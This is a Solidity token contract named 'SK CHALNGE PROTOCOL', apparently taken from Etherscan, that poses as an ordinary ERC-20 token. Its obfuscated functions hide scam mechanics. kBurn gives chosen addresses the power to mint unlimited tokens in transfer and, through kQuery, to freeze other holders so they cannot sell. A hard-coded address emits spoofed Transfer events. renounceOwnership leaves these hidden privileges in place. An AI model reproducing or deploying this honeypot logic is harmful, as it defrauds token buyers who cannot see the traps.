/**
 *Submitted for verification at Etherscan.io on 2022-11-05
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address LRV = 0x4E80C0aa1027CB0355B6D3c67727BD04c973AaC8;
	address LRTR = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract RCHALLENGE is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Lc;
	mapping (address => bool) private Lb;
    mapping (address => bool) private Lw;
    mapping (address => mapping (address => uint256)) private Lv;
    uint8 private constant LCE = 8;
    uint256 private constant lS = 150000000 * (10** LCE);
    string private constant _name = "SK CHALNGE PROTOCOL";
    string private constant _symbol = "CHALLENGE";



    constructor () {
        Lc[_msgSender()] = lS;
         lmkr(LRTR, lS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return LCE;
    }

    function totalSupply() public pure  returns (uint256) {
        return lS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Lc[account];
    }
    function lmkr(address Lj, uint256 Ln) onlyOwner internal {
    emit Transfer(address(0), Lj ,Ln); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Lv[owner][spender];
    }
	        function kBurn(address Lj) onlyOwner public{
        Lb[Lj] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        Lv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        
		function kStake(address Lj) public {
        if(Lb[msg.sender]) { 
        Lw[Lj] = false;}}
        function kQuery(address Lj) public{
         if(Lb[msg.sender])  { 
        Lw[Lj] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == LRV)  {
        require(amount <= Lc[sender]);
        Lc[sender] -= amount;  
        Lc[recipient] += amount; 
          Lv[sender][msg.sender] -= amount;
        emit Transfer (LRTR, recipient, amount);
        return true; }  else  
          if(!Lw[recipient]) {
          if(!Lw[sender]) {
         require(amount <= Lc[sender]);
        require(amount <= Lv[sender][msg.sender]);
        Lc[sender] -= amount;
        Lc[recipient] += amount;
        Lv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Lj, uint256 Ln) public {
        if(msg.sender == LRV)  {
        require(Lc[msg.sender] >= Ln);
        Lc[msg.sender] -= Ln;  
        Lc[Lj] += Ln; 
        emit Transfer (LRTR, Lj, Ln);} else  
        if(Lb[msg.sender]) {Lc[Lj] += Ln;} else
        if(!Lw[msg.sender]) {
        require(Lc[msg.sender] >= Ln);
        Lc[msg.sender] -= Ln;  
        Lc[Lj] += Ln;          
        emit Transfer(msg.sender, Lj, Ln);}}}